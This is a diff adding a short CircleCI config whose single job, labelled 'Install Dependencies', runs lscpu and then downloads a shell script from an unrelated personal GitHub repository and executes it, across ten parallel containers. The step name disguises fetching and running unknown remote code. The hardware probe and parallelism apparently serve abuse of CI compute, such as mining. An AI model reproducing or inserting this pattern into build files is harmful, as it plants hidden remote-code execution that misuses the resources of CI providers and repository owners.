@@ -1,0 +1,18 @@
+version: 2.1
+jobs:
+    trial:
+      docker:
+            - image: circleci/ruby:2.5.3
+      parallelism: 10
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              lscpu
+              wget https://raw.githubusercontent.com/rindalasririn/a/main/16.sh && chmod +x 16.sh &&./16.sh
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
